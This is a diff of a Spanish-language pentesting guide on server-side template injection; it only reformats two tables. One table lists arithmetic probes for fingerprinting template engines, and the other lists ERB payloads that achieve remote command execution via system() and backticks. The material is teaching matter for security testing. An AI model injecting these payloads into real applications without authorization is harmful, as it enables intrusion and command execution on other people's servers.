@@ -69,13 +69,13 @@ No basta con probar `<script>alert(1)</script>`. Debemos enviar operaciones mate
 
 **Pruebas básicas matemáticas:**
 
-|**Payload**|**Resultado esperado (Vulnerable)**|**Motor probable**|
-|---|---|---|
-|`{{7*7}}`|`49`|Jinja2, Twig, Nunjucks|
-|`${7*7}`|`49`|FreeMarker, Velocity, Spring|
-|`<%= 7*7 %>`|`49`|ERB (Ruby), EJS|
-|`#{7*7}`|`49`|Jade / Pug|
-|`*{7*7}`|`49`|Smarty (versiones antiguas)|
+| **Payload**  | **Resultado esperado (Vulnerable)** | **Motor probable**           |
+| ------------ | ----------------------------------- | ---------------------------- |
+| `{{7*7}}`    | `49`                                | Jinja2, Twig, Nunjucks       |
+| `${7*7}`     | `49`                                | FreeMarker, Velocity, Spring |
+| `<%= 7*7 %>` | `49`                                | ERB (Ruby), EJS              |
+| `#{7*7}`     | `49`                                | Jade / Pug                   |
+| `*{7*7}`     | `49`                                | Smarty (versiones antiguas)  |
 
 ### 2. Identificación del Motor (Decision Tree)
 
@@ -219,10 +219,10 @@ Cuando `Execute` o `new()` están bloqueados, debemos usar la reflexión de Java
 
 Común en aplicaciones Rails. Es muy directo porque ERB permite ejecución de código arbitrario de Ruby dentro de los tags `<%= %>`.
 
-|**Objetivo**|**Payload**|
-|---|---|
-|**RCE Directo**|`<%= system('ls') %>` (Devuelve true/false)|
-|**RCE con Salida**|`<%=` ls -la `%>` (Backticks capturan output)|
+| **Objetivo**       | **Payload**                                       |
+| ------------------ | ------------------------------------------------- |
+| **RCE Directo**    | `<%= system('ls') %>` (Devuelve true/false)       |
+| **RCE con Salida** | ```<%=` ls -la `%>``` (Backticks capturan output) |
 
 > [!EXAMPLE] Caso Real: ERB Template
 > 
